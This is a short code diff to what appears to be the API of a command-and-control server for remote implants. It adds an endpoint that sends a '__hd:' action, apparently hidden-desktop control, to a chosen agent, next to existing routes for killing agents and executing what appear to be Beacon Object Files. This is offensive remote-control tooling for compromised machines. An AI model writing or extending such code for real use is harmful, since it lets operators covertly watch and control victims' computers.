@@ -174,6 +174,15 @@ async def kill_agent(agent_id: str):
     return {"status": "ok", "message": result}
 
 
+@router.post("/agents/{agent_id}/desktop")
+async def desktop(agent_id: str, req: CommandRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    action = (req.command or "frame").strip()
+    result = await _server.send_command_to_agent(agent_id, "__hd:" + action)
+    return {"output": result}
+
+
 @router.post("/agents/{agent_id}/bof")
 async def execute_bof(agent_id: str, req: BOFRequest):
     if not _server or agent_id not in _server.agents:
